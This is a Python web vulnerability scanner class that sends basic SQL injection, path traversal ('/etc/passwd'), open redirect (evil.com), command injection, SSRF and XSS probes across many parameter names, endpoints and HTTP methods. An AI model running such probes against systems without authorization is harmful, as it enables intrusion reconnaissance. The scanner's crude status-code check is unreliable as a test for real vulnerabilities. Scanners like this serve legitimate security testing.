import requests, re, json
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import HTTP_HEADERS, DEFAULT_TIMEOUT, COMMON_ENDPOINTS

class Top25FastScanner:
    METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]

    PAYLOAD = {
        "SQLi": "1 OR 1=1",
        "LFI": "../../../../etc/passwd",
        "OpenRedirect": "http://evil.com",
        "RCE": "id",
        "SSRF": "http://127.0.0.1",
        "XSS": "<script>alert(1)</script>"
    }

    PARAMS = {
        "SQLi": ["id", "page", "dir", "search", "category", "file", "class", "url", "news", "item", "menu", "lang", "name", "ref", "title", "view", "topic", "thread", "type", "date", "form", "join", "main", "nav", "region"],
        "LFI": ["cat", "dir", "action", "board", "date", "detail", "file", "download", "path", "folder", "prefix", "include", "page", "inc", "locate", "show", "doc", "site", "type", "view", "content", "document", "layout", "mod", "conf"],
        "OpenRedirect": ["next", "url", "target", "rurl", "dest", "destination", "redir", "redirect_uri", "redirect_url", "redirect", "image_url", "go", "return", "returnTo", "return_to", "checkout_url", "continue", "return_path"],
        "RCE": ["cmd", "exec", "command", "execute", "ping", "query", "jump", "code", "reg", "do", "func", "arg", "option", "load", "process", "step", "read", "function", "req", "feature", "exe", "module", "payload", "run", "print"],
        "SSRF": ["dest", "redirect", "uri", "path", "continue", "url", "window", "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return", "page", "feed", "host", "port", "to", "out", "view", "dir"],
        "XSS": ["q", "s", "search", "id", "lang", "keyword", "query", "page", "keywords", "year", "view", "email", "type", "name", "p", "month", "image", "list_type", "url", "terms", "categoryid", "key", "login", "begindate", "enddate"]
    }

    def __init__(self, args):
        self.target = f"http://{args.target}".rstrip("/")
        self.thread = args.threads
        self.session = requests.Session()
        self.session.headers.update(HTTP_HEADERS)

    def scan(self):
        endpoints = open(COMMON_ENDPOINTS, "r").read().splitlines()
        tasks = []
        results = []

        with ThreadPoolExecutor(max_workers=self.thread) as executor:
            for category, params in self.PARAMS.items():
                if category not in self.PAYLOAD:
                    continue
                payload = self.PAYLOAD[category]
                for param in params:
                    for endpoint in endpoints:
                        url = urljoin(self.target, endpoint)
                        for method in self.METHODS:
                            tasks.append(
                                executor.submit(
                                    self._scan_once, category, method, url, endpoint, param, payload
                                )
                            )

            for future in as_completed(tasks):
                res = future.result()
                if res:
                    results.append(res)

        return {"target": self.target, "findings": results}

    def _scan_once(self, category, method, url, endpoint, param, value):
        try:
            data = {param: value}
            if method == "GET":
                r = self.session.get(f"{url}?{urlencode(data)}", timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            else:
                r = self.session.request(method, url, data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=False)

            if r.status_code not in [401, 403, 404, 405] and r.status_code < 500:
                return {
                    "category": category,
                    "method": method,
                    "endpoint": endpoint,
                    "param": param,
                    "payload": value,
                    "status": r.status_code
                }

        except:
            return None

def scan(args=None):
    return Top25FastScanner(args).scan()
